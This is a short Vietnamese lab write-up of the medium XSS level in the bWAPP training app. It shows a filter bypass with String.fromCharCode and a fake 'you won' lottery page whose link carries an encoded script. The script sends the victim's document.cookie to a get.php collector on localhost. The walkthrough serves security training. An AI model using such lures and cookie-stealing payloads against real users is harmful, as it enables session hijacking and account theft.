### Dò XSS
Thực hiện như case Low, ta thấy khi nhập js vào ô bất kì đều không có respond.

![image](https://github.com/user-attachments/assets/50fcf1b2-09d2-4e96-9d61-ab86e2ea66a2)

Kiểm tra mã nguồn ta thấy vẫn có dòng <script>alert(\"thiep\")</script>

![image](https://github.com/user-attachments/assets/ae6beda1-3c26-4dc6-adce-732b2454f0f6)

Có thể do cơ chế lọc chữ của web, ta thử bằng ascii encode:
```javascript
<script>alert(String.fromCharCode(88, 83, 83))</script>
```
![image](https://github.com/user-attachments/assets/e4fcecf9-c6c4-4fb4-ba03-1c339a405b2b)

Vậy là xác định trang web có dính XSS

### Khai thác

Sử dụng lại file get.php và index.php case Low.

file index.php sửa lại như sau
```java script
<html>
<head>
<title>Lottery hihi</title>
</head>
<body>
	<h1 align="center">CONGRATULATIONS!!!</h1>
	<h1 align="center">YOU WON!!!</h1>
	Click this <a href="http://localhost/bwapp/xss_get.php?firstname=<script>window.open(String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 103, 101, 116, 46, 112, 104, 112, 63, 99, 111, 111, 107, 105, 101, 61, 34, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))</script>&lastname=a&form=submit">link</a> to see your prize
</body>
</html>
```
Còn lại làm tương tự.
